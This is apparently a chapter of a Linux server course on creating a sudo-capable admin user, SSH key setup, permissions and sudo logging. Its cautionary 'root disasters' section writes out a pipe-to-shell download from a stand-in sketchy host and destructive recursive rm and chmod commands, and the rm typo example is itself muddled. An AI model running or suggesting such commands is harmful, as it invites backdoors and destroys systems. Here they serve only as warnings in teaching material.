# Chapter 6: User Management

**Creating a Proper Admin User and Understanding Linux Users**

---

## Learning Objectives

By the end of this chapter, you'll be able to:
- ✅ Understand why root-only is dangerous
- ✅ Create a new admin user
- ✅ Set up SSH keys for the new user
- ✅ Configure sudo access
- ✅ Switch between users
- ✅ Understand user security

**Time Required:** 30-40 minutes

---

## Why Not Use Root?

### The Root Problem

**You're currently using root for everything:**
```bash
root@mywebclass-prod:~#
```

**This is like:**
- Driving with no brakes
- Surgery with no safety checks
- Bank vault with no verification

---

### Real-World Root Disasters

**Story 1: The Typo**
```bash
# Meant to type:
rm -rf ./temp/

# Actually typed (missing dot):
rm -rf /temp    # Deleted system directories!
```

**Result:** Entire server destroyed in seconds.

---

**Story 2: The Copy-Paste**
```bash
# Found online: "Fix your issue with this command!"
curl https://sketchy-site.com/fix.sh | bash
```

**What happened:**
- Script installed backdoor
- Created hidden admin accounts
- Sent data to attacker
- All because root ran it

---

**Story 3: The Late Night**
```bash
# Tired developer at 2am:
chmod 777 / -R    # OOPS! Wrong directory
```

**Result:** Every file on system now world-writable. Security gone.

---

### Why Root is Dangerous

**No safety net:**
- ❌ No "Are you sure?" for destructive commands
- ❌ No undo
- ❌ No protection from typos
- ❌ No audit trail of who did what
- ❌ One compromised connection = full system access

**Professional practice:**
- ✅ Use regular user for daily work
- ✅ Use `sudo` only when needed
- ✅ Each admin has own account
- ✅ Audit trail for all privileged actions

---

## Linux User System

### Understanding Users and Groups

**Linux is multi-user:**
- Multiple people can use same server
- Each has own account
- Each has own files
- Permissions control access

**Types of users:**

1. **root (UID 0)**
   - Superuser
   - Can do anything
   - Bypasses all permissions

2. **System users (UID 1-999)**
   - Run services (www-data, mysql)
   - No login access
   - Limited permissions

3. **Regular users (UID 1000+)**
   - Human accounts
   - Have home directories
   - Can be granted sudo access

---

### What is Sudo?

**sudo = "superuser do"**

**How it works:**
```bash
# As regular user:
apt update    # Permission denied!

# With sudo:
sudo apt update    # Works! (if user has sudo access)
```

**Benefits:**
- ✅ Must explicitly request privilege
- ✅ Logs every privileged command
- ✅ Can revoke access easily
- ✅ Requires password (extra verification)
- ✅ Time-limited (expires after 15 min)

**Real-world analogy:**
- **Root login** = Walking around with master key ring
- **Sudo** = Requesting key only when needed, returning it after

---

## Creating Your Admin User

### Step 1: Choose Username

**Naming conventions:**
- ✅ Lowercase letters
- ✅ Numbers (but not first character)
- ✅ Underscores, hyphens
- ❌ No spaces
- ❌ No special characters

**Good examples:**
- `alice`
- `jsmith`
- `admin_user`
- `deploy`

**Bad examples:**
- `Alice` (use lowercase)
- `john smith` (no spaces)
- `user@admin` (no special chars)

**For this course, we'll use:** `deploy`

---

### Step 2: Create the User

**Connect as root:**
```bash
ssh root@YOUR_SERVER_IP
```

**Create new user:**
```bash
adduser deploy
```

**You'll see:**
```
Adding user `deploy' ...
Adding new group `deploy' (1000) ...
Adding new user `deploy' (1000) with group `deploy' ...
Creating home directory `/home/deploy' ...
Copying files from `/etc/skel' ...
New password:
```

**Enter a strong password:**
- At least 12 characters
- Mix of letters, numbers, symbols
- Don't reuse other passwords
- Save in password manager

**You'll be asked:**
```
Retype new password:
Full Name []:
Room Number []:
Work Phone []:
Home Phone []:
Other []:
Is the information correct? [Y/n]
```

**You can skip the extra info:**
- Just press Enter for each
- Or fill it in (your choice)
- Type `Y` at the end

---

### Step 3: Verify User Creation

**Check user exists:**
```bash
id deploy
```

**Output:**
```
uid=1000(deploy) gid=1000(deploy) groups=1000(deploy)
```

**Explanation:**
- `uid=1000` - User ID
- `gid=1000` - Primary group ID
- `groups=1000(deploy)` - Group memberships

**Check home directory:**
```bash
ls -la /home/deploy
```

**Should see:**
```
total 20
drwxr-x--- 2 deploy deploy 4096 Nov 12 10:00 .
drwxr-xr-x 3 root   root   4096 Nov 12 10:00 ..
-rw-r--r-- 1 deploy deploy  220 Nov 12 10:00 .bash_logout
-rw-r--r-- 1 deploy deploy 3526 Nov 12 10:00 .bashrc
-rw-r--r-- 1 deploy deploy  807 Nov 12 10:00 .profile
```

---

### Step 4: Grant Sudo Access

**Add user to sudo group:**
```bash
usermod -aG sudo deploy
```

**Explanation:**
- `usermod` = Modify user
- `-aG` = Append to group (don't remove from others)
- `sudo` = The admin group
- `deploy` = Username

**Verify sudo access:**
```bash
groups deploy
```

**Output:**
```
deploy : deploy sudo
```

**User is now in both:**
- `deploy` group (their primary group)
- `sudo` group (admin privileges)

---

### Step 5: Test the New User

**Switch to new user:**
```bash
su - deploy
```

**Prompt changes:**
```
root@mywebclass-prod:~# su - deploy
deploy@mywebclass-prod:~$
```

**Notice:**
- `root` became `deploy`
- `#` became `$` (indicates regular user)
- You're now in `/home/deploy`

**Test sudo access:**
```bash
sudo apt update
```

**First time, you'll see:**
```
[sudo] password for deploy:
```

**Enter deploy user's password.**

**You'll see:**
```
We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.
```

**Then it runs the command!**

**If successful:**
```
Hit:1 http://mirrors.digitalocean.com/ubuntu noble InRelease
...
All packages are up to date.
```

**Exit back to root:**
```bash
exit
```

---

## Setting Up SSH Keys for New User

### Why SSH Keys for Regular User?

**Currently:**
- Root: SSH key access ✅
- Deploy: Password only ❌

**Problems with password-only:**
- Can be brute-forced
- Weak if user picks weak password
- No key-based security
- Can't disable password auth later

**Solution:** Add SSH keys to deploy user too.

---

### Understanding SSH Key Setup

**What we need to do:**
1. Create `.ssh` directory in deploy's home
2. Create `authorized_keys` file
3. Copy root's authorized keys to deploy
4. Set correct permissions (critical!)

**File structure:**
```
/home/deploy/
└── .ssh/                  (directory, permissions 700)
    └── authorized_keys    (file, permissions 600)
```

---

### Method 1: Copy from Root (Easiest)

**As root, run these commands:**

**1. Create SSH directory:**
```bash
mkdir -p /home/deploy/.ssh
```

**2. Copy authorized keys:**
```bash
cp /root/.ssh/authorized_keys /home/deploy/.ssh/authorized_keys
```

**3. Set ownership:**
```bash
chown -R deploy:deploy /home/deploy/.ssh
```

**4. Set permissions:**
```bash
chmod 700 /home/deploy/.ssh
chmod 600 /home/deploy/.ssh/authorized_keys
```

**Why these permissions?**
- `700` = Only owner can read/write/execute
- `600` = Only owner can read/write
- SSH refuses to work if permissions too open!

---

### Method 2: Manual Key Addition

**If you want different keys for deploy user:**

**1. On your local computer, generate new key pair:**
```bash
ssh-keygen -t ed25519 -C "deploy@mywebclass" -f ~/.ssh/deploy_key
```

**2. Display public key:**
```bash
cat ~/.ssh/deploy_key.pub
```

**3. Copy the output (starts with `ssh-ed25519`)**

**4. Back on server (as root):**
```bash
mkdir -p /home/deploy/.ssh
nano /home/deploy/.ssh/authorized_keys
```

**5. Paste the public key, save and exit (Ctrl+X, Y, Enter)**

**6. Set permissions:**
```bash
chown -R deploy:deploy /home/deploy/.ssh
chmod 700 /home/deploy/.ssh
chmod 600 /home/deploy/.ssh/authorized_keys
```

---

### Verify SSH Key Setup

**Check file exists:**
```bash
ls -la /home/deploy/.ssh/
```

**Should see:**
```
drwx------ 2 deploy deploy 4096 Nov 12 10:30 .
drwxr-x--- 3 deploy deploy 4096 Nov 12 10:30 ..
-rw------- 1 deploy deploy  567 Nov 12 10:30 authorized_keys
```

**Check permissions (critical!):**
```bash
stat -c "%a %n" /home/deploy/.ssh
stat -c "%a %n" /home/deploy/.ssh/authorized_keys
```

**Should show:**
```
700 /home/deploy/.ssh
600 /home/deploy/.ssh/authorized_keys
```

**Check ownership:**
```bash
ls -la /home/deploy/.ssh/authorized_keys
```

**Should show:**
```
-rw------- 1 deploy deploy 567 Nov 12 10:30 /home/deploy/.ssh/authorized_keys
```

**All three must be correct:** permissions, ownership, file exists!

---

## Testing the New User

### Test SSH Connection

**Open NEW terminal window (don't disconnect from root).**

**Connect as deploy user:**
```bash
ssh deploy@YOUR_SERVER_IP
```

**If you used Method 2 with different key:**
```bash
ssh -i ~/.ssh/deploy_key deploy@YOUR_SERVER_IP
```

**Should connect without password!**

**You'll see:**
```
deploy@mywebclass-prod:~$
```

**Notice:**
- `deploy` instead of `root`
- `$` instead of `#`
- You're in `/home/deploy` instead of `/root`

---

### Test Sudo Access

**As deploy user:**
```bash
# Check disk space (doesn't need sudo)
df -h

# Update packages (needs sudo)
sudo apt update
```

**Enter deploy's password when prompted.**

**Should work!** You now have full admin access through sudo.

---

### Test Regular Commands

**Create a test file:**
```bash
echo "Hello from deploy user!" > ~/test.txt
cat ~/test.txt
```

**Check your location:**
```bash
pwd
```

**Output:** `/home/deploy`

**Try to access root's files (should fail):**
```bash
ls /root
```

**Output:**
```
ls: cannot open directory '/root': Permission denied
```

**This is good!** Regular users can't read root's files.

**With sudo (should work):**
```bash
sudo ls /root
```

**Enter password, now it works.**

---

## User Management Commands

### Essential Commands

**List all users:**
```bash
cat /etc/passwd | grep "/home"
```

**Or just see human users:**
```bash
getent passwd | grep -E "^[a-z]+:" | grep "[1-9][0-9][0-9][0-9]"
```

**See who's logged in:**
```bash
who
```

**See login history:**
```bash
last
```

**See failed login attempts:**
```bash
sudo lastb
```

---

### User Information

**Get user info:**
```bash
id deploy
```

**Check user's groups:**
```bash
groups deploy
```

**See all groups:**
```bash
cat /etc/group
```

**See sudo group members:**
```bash
getent group sudo
```

---

### Switching Users

**From root to deploy:**
```bash
su - deploy
```

**From deploy to root:**
```bash
su -
# Or:
sudo su -
```

**Run one command as another user:**
```bash
sudo -u deploy whoami    # Runs whoami as deploy
```

---

## Understanding Sudo

### Sudo Configuration

**Sudo config file:**
```bash
sudo visudo
```

**⚠️ Always use `visudo`, not nano/vim directly!**
- Validates syntax before saving
- Prevents lockout from typos

**Key lines:**
```
# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
```

**Translation:**
- `%sudo` = Members of sudo group
- `ALL` = From any host
- `(ALL:ALL)` = As any user:group
- `ALL` = Run any command

---

### Sudo Without Password (Optional, Not Recommended)

**To allow deploy to sudo without password:**
```bash
sudo visudo
```

**Add at end:**
```
deploy ALL=(ALL) NOPASSWD: ALL
```

**⚠️ Security consideration:**
- More convenient
- Less secure
- Anyone with access to deploy account has root
- Only do this for automated systems, not human users

**For this course, keep password requirement!**

---

### Sudo Logs

**See what's been run with sudo:**
```bash
sudo cat /var/log/auth.log | grep sudo
```

**Recent sudo commands:**
```bash
sudo cat /var/log/auth.log | grep sudo | tail -20
```

**This is accountability!** Every sudo command is logged.

---

## Best Practices

### Daily Workflow

**✅ Correct workflow:**
1. SSH in as deploy: `ssh deploy@YOUR_SERVER_IP`
2. Run regular commands without sudo
3. Use sudo only when needed: `sudo apt update`
4. Never switch to root unless absolutely necessary

**❌ Wrong workflow:**
1. SSH as root
2. Do everything as root
3. Hope nothing breaks

---

### Multiple Administrators

**If multiple people manage server:**

**Each person gets their own account:**
```bash
sudo adduser alice
sudo adduser bob
sudo adduser charlie

sudo usermod -aG sudo alice
sudo usermod -aG sudo bob
sudo usermod -aG sudo charlie
```

**Benefits:**
- Know who did what (sudo logs)
- Can revoke access individually
- Each has their own SSH keys
- Professional and secure

**Never share accounts!**

---

### User Naming Convention

**For different purposes:**
- `deploy` - For deployment tasks
- `firstname` - Personal admin accounts
- `app_name` - Service accounts (no login)

**Examples:**
```bash
# Admin users (humans)
alice
bob
jsmith

# Service accounts (automated tasks)
gitlab_runner
backup_user
monitoring
```

---

## Common Issues

### Problem: Permission Denied When Testing SSH

**Error:**
```
Permission denied (publickey)
```

**Check permissions:**
```bash
# On server as root:
ls -la /home/deploy/.ssh/
stat -c "%a" /home/deploy/.ssh
stat -c "%a" /home/deploy/.ssh/authorized_keys
```

**Should be:**
- Directory: 700
- authorized_keys: 600

**Fix:**
```bash
sudo chmod 700 /home/deploy/.ssh
sudo chmod 600 /home/deploy/.ssh/authorized_keys
sudo chown -R deploy:deploy /home/deploy/.ssh
```

---

### Problem: Sudo Not Working

**Error:**
```
deploy is not in the sudoers file. This incident will be reported.
```

**Solution:**
```bash
# As root:
usermod -aG sudo deploy

# Verify:
groups deploy
```

**If still not working, user needs to log out and back in:**
```bash
# As deploy:
exit

# SSH back in:
ssh deploy@YOUR_SERVER_IP
```

---

### Problem: Wrong Permissions Block SSH

**SSH is VERY strict about permissions!**

**Check SSH logs for errors:**
```bash
# As root:
sudo tail -f /var/log/auth.log
```

**Try connecting in another terminal:**
```bash
ssh deploy@YOUR_SERVER_IP
```

**Look for errors like:**
```
Authentication refused: bad ownership or modes for directory /home/deploy/.ssh
```

**Fix permissions:**
```bash
sudo chown -R deploy:deploy /home/deploy/.ssh
sudo chmod 700 /home/deploy/.ssh
sudo chmod 600 /home/deploy/.ssh/authorized_keys
```

---

### Problem: Can't Read authorized_keys

**SSH might complain:**
```
Could not read authorized_keys file
```

**Check SELinux context (unlikely on Ubuntu, but possible):**
```bash
sudo restorecon -R -v /home/deploy/.ssh
```

**Verify file is readable:**
```bash
sudo cat /home/deploy/.ssh/authorized_keys
```

**Should show public key(s).**

---

## Verification Checklist

**Before Chapter 7:**

- ✅ Created user with `adduser deploy`
- ✅ Added user to sudo group
- ✅ Created `/home/deploy/.ssh` directory
- ✅ Copied/added authorized_keys file
- ✅ Set permissions (700 for dir, 600 for file)
- ✅ Set ownership (deploy:deploy)
- ✅ Successfully SSH'd as deploy user
- ✅ Tested sudo access
- ✅ Understand when to use sudo vs root

---

## Practice Exercises

### Exercise 1: User Creation Practice

**Create a second test user:**
```bash
# As root or with sudo:
sudo adduser testuser
sudo usermod -aG sudo testuser

# Set up SSH:
sudo mkdir -p /home/testuser/.ssh
sudo cp /home/deploy/.ssh/authorized_keys /home/testuser/.ssh/
sudo chown -R testuser:testuser /home/testuser/.ssh
sudo chmod 700 /home/testuser/.ssh
sudo chmod 600 /home/testuser/.ssh/authorized_keys

# Test connection:
ssh testuser@YOUR_SERVER_IP

# Clean up:
sudo userdel -r testuser
```

---

### Exercise 2: Sudo Practice

**As deploy user:**
```bash
# Check disk space (no sudo needed)
df -h

# Try to update (needs sudo)
apt update         # Should fail

# Now with sudo
sudo apt update    # Should work

# View sudo logs
sudo cat /var/log/auth.log | grep sudo | tail -10
```

---

### Exercise 3: Permission Troubleshooting

**Break and fix permissions:**
```bash
# Break permissions (as deploy):
chmod 777 ~/.ssh
chmod 777 ~/.ssh/authorized_keys

# Try to SSH from another terminal - should fail!

# Fix (as deploy or root):
sudo chmod 700 /home/deploy/.ssh
sudo chmod 600 /home/deploy/.ssh/authorized_keys

# Try SSH again - should work!
```

---

## Security Notes

### What We Accomplished

**Major improvements:**
- ✅ Created non-root user
- ✅ Set up sudo access
- ✅ SSH keys for regular user
- ✅ Proper file permissions

**Still vulnerable:**
- ❌ Root login still enabled via SSH
- ❌ Password authentication still enabled
- ❌ Default SSH port (22)
- ❌ No firewall

**Next chapter fixes these!**

---

### Sudo Security Tips

**Good practices:**
- Review sudo logs regularly
- Use sudo only when needed
- Don't use `sudo su -` as default workflow
- Keep sudo password required
- Audit who has sudo access

**Warning signs:**
```bash
# These suggest someone bypassing sudo:
sudo su -                # Becoming root directly
sudo bash                # Root shell
sudo -i                  # Root shell

# These are fine:
sudo apt update          # Specific command
sudo systemctl restart   # Specific task
```

---

## Key Takeaways

**Remember:**

1. **Never use root for daily tasks**
   - Root can destroy system instantly
   - No safety checks
   - Creates security holes

2. **Sudo provides accountability**
   - Every privileged command logged
   - Requires password verification
   - Can be revoked easily

3. **Each admin needs own account**
   - Don't share accounts
   - Individual SSH keys
   - Traceable actions

4. **Permissions matter for SSH**
   - .ssh directory: 700
   - authorized_keys: 600
   - Must be owned by user
   - SSH refuses if too open

5. **Test before disconnecting from root**
   - Keep root connection open
   - Test new user in separate window
   - Verify sudo access works
   - Don't lock yourself out!

---

## Next Steps

**You now have:**
- ✅ Proper admin user (deploy)
- ✅ Sudo access configured
- ✅ SSH key authentication
- ✅ Secure user setup

**In Chapter 7:**
- Disable root SSH login
- Disable password authentication
- Change SSH port
- Configure SSH security
- Restart SSH safely

**Critical:** Keep root connection open while doing Chapter 7!

---

## Quick Reference

### User Management Commands

```bash
# Create user
sudo adduser username

# Grant sudo access
sudo usermod -aG sudo username

# Set up SSH keys
sudo mkdir -p /home/username/.ssh
sudo cp ~/.ssh/authorized_keys /home/username/.ssh/
sudo chown -R username:username /home/username/.ssh
sudo chmod 700 /home/username/.ssh
sudo chmod 600 /home/username/.ssh/authorized_keys

# Switch users
su - username      # From root to user
sudo su -          # From user to root
exit               # Back to previous user

# User info
id username
groups username
who                # Who's logged in
last               # Login history
```

### SSH Connection

```bash
# Connect as deploy user
ssh deploy@YOUR_SERVER_IP

# Use sudo for admin tasks
sudo command
```

---

[← Previous: Chapter 5 - First Connection](05-first-connection.md) | [Next: Chapter 7 - SSH Hardening →](07-ssh-hardening.md)
